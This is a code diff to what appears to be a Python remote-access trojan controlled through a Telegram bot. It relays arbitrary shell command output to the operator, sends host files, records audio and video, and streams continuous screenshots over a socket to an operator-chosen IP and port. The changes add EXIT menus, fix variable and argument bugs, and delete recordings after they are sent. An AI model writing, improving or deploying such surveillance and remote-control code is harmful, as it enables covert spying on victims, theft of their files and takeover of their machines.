@@ -28,7 +28,7 @@ markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
         KeyboardButton("record_audio"), KeyboardButton("get_audio"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
-        KeyboardButton("screenshot"), KeyboardButton("get_screen"))
+        KeyboardButton("get_screen"))
 
 """ Fn """
 def checkID(ms):
@@ -119,7 +119,8 @@ class Client:
                         bot.send_message(ADMIN_ID, output, reply_markup=markup)
                     except Exception as e:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
-
+                else:
+                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
             bot.register_next_step_handler(ms, chdir_next)
 
         elif ms.text == "dir":
@@ -147,23 +148,31 @@ class Client:
                         bot.send_message(ADMIN_ID, "File removed ✅", reply_markup=markup)
                     except Exception as e:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
+                else:
+                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, rm_file_next)
 
         elif ms.text == "exec_cmd":
+            markup_exec_cmd = ReplyKeyboardMarkup()
+            markup_exec_cmd.add("EXIT")
+            
             bot.send_message(ADMIN_ID, "Enter command...")
 
             @bot.message_handler(content_types=["text"])
             def exec_cmd_next(ms):
-                try:
-                    output = subprocess.run(ms.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    output = output.stdout + output.stderr
-                    if output:
-                        bot.send_message(ADMIN_ID, output, reply_markup=markup)
-                    else:
-                        bot.send_message(ADMIN_ID, "<Empty>", reply_markup=markup)
-                except Exception as e:
-                    bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                if ms.text != "EXIT":
+                    try:
+                        output = subprocess.run(ms.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        output = output.stdout + output.stderr
+                        if output:
+                            bot.send_message(ADMIN_ID, output, reply_markup=markup)
+                        else:
+                            bot.send_message(ADMIN_ID, "<Empty>", reply_markup=markup)
+                    except Exception as e:
+                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                else:
+                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, exec_cmd_next)
 
@@ -178,30 +187,36 @@ class Client:
                         bot.send_document(ADMIN_ID, open(ms.text, "rb"), reply_markup=markup)
                     except Exception as e:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}")
-
+                else:
+                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
             bot.register_next_step_handler(ms, get_file_next)
 
 
         elif ms.text == "record_audio":
-            bot.send_message(ADMIN_ID, "Enter time, quantity iteration...", reply_markup=ReplyKeyboardRemove())
+            markup_record_audio = ReplyKeyboardMarkup()
+            markup_record_audio.add("EXIT")
+            bot.send_message(ADMIN_ID, "Enter time, quantity iteration...", reply_markup=markup_record_audio)
             
             @bot.message_handler(content_types=["text"])
             def record_audio_next(ms):
-                try:
-                    list_data = ms.text.split(" ")
-                    time = int(list_data[0])
-                    quantity = int(list_data[1])
-                    bot.send_message(ADMIN_ID, "Recording 🎲")
-                    
-                    for i in range(quantity):
-                        recordAUDIO(time)
-                        with open(self.filename_audio, 'rb') as audio:
-                            bot.send_audio(ADMIN_ID, audio)
-                    
-                    os.remove(self.filename_audio)
-                    bot.send_message(ADMIN_ID, "Finished recording ✅", reply_markup=markup)
-                except Exception as e:
-                    bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                if ms.text != "EXIT":
+                    try:
+                        list_data = ms.text.split(" ")
+                        time = int(list_data[0])
+                        quantity = int(list_data[1])
+                        bot.send_message(ADMIN_ID, "Recording 🎲")
+                        
+                        for i in range(quantity):
+                            recordAUDIO(self, time)
+                            with open(self.filename_audio, 'rb') as audio:
+                                bot.send_audio(ADMIN_ID, audio)
+                        
+                        os.remove(self.filename_audio)
+                        bot.send_message(ADMIN_ID, "Finished recording ✅", reply_markup=markup)
+                    except Exception as e:
+                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                else:
+                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, record_audio_next)
 
@@ -231,6 +246,7 @@ class Client:
                 bot.send_audio(ADMIN_ID, audio)
             
             os.remove(self.filename_audio)
+            os.remove("dump_record_audio.dat")
 
 
 
@@ -241,10 +257,10 @@ class Client:
                 stop_time = round(time.time()) + 70
 
                 while os.path.exists(self.filename_video):
-                    index = filename_video[5:-4]
-                    filename_video = filename_video[:-5] + str(int(index) + 1) + ".avi"
+                    index = self.filename_video[5:-4]
+                    self.filename_video = self.filename_video[:-5] + str(int(index) + 1) + ".avi"
 
-                out = cv2.VideoWriter(filename=self.filename_video, fourcc=self.ffourcc, fps=15.0, frameSize=(self.SREEN_SIZE))
+                out = cv2.VideoWriter(filename=self.filename_video, fourcc=self.fourcc, fps=15.0, frameSize=(self.SCREEN_SIZE))
 
                 while True:
                     if round(time.time()) == stop_time:
@@ -259,8 +275,7 @@ class Client:
                     out.write(frame)
 
         elif ms.text == "get_video":
-            markup_video = ReplyKeyboardMarkup()
-            create_markup(markup_video)
+            markup_video = create_markup()
             bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_video)
             
             @bot.message_handler(content_types=["text"])
@@ -268,44 +283,51 @@ class Client:
                 if ms.text != "EXIT":
                     try:
                         bot.send_video(ADMIN_ID, open(ms.text, "rb"), reply_markup=markup)
+                        os.remove(ms.text)
                     except Exception as e:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}")
-
+                else:
+                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
             bot.register_next_step_handler(ms, get_video_next)
 
 
         elif ms.text == "get_screen":
-            bot.send_message(ADMIN_ID, "Enter port, ip...")
+            markup_get_screen = ReplyKeyboardMarkup()
+            markup_get_screen.add("EXIT")
+            bot.send_message(ADMIN_ID, "Enter port, ip...", reply_markup=markup_get_screen)
             
             @bot.message_handler(content_types=["text"])
             def getscreen_next(ms):
-                try:
-                    list_data = ms.text.split()
-                    PORT = int(list_data[0])
-                    IP = list_data[1]
+                if ms.text != "EXIT":
+                    try:
+                        list_data = ms.text.split()
+                        PORT = int(list_data[0])
+                        IP = list_data[1]
 
-                    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        
+                        while True:
+                            try:
+                                bot.send_message(ADMIN_ID, "Connection attempt 🎲")
+                                clientsocket.connect((IP, PORT))
+                                break
+                            except Exception as e:
+                                bot.send_message(ADMIN_ID, "Сonnection error ❌")
+                                time.sleep(10)
+
+                        bot.send_message(ADMIN_ID, "Successful connection ✅")
+                        while True:
+                            image = pyautogui.screenshot()
+                            image = image.resize((1440, 900))
+                            image = np.array(image)
+                            img = Image.frombytes('RGB', (1440, 900), image)
+                            data = pickle.dumps(np.array(img))
+                            clientsocket.sendall(struct.pack("L", len(data)) + data)
+                    except Exception as e:
+                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
+                else:
+                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
                     
-                    while True:
-                        try:
-                            bot.send_message(ADMIN_ID, "Connection attempt 🎲")
-                            clientsocket.connect((IP, PORT))
-                            break
-                        except Exception as e:
-                            bot.send_message(ADMIN_ID, "Сonnection error ❌")
-                            time.sleep(10)
-
-                    bot.send_message(ADMIN_ID, "Successful connection ✅")
-                    while True:
-                        image = pyautogui.screenshot()
-                        image = image.resize((1440, 900))
-                        image = np.array(image)
-                        img = Image.frombytes('RGB', (1440, 900), image)
-                        data = pickle.dumps(np.array(img))
-                        clientsocket.sendall(struct.pack("L", len(data)) + data)
-                except Exception as e:
-                    bot.send_message(ADMIN_ID, f"Error:\n{e}")
-            
             bot.register_next_step_handler(ms, getscreen_next)
 
 
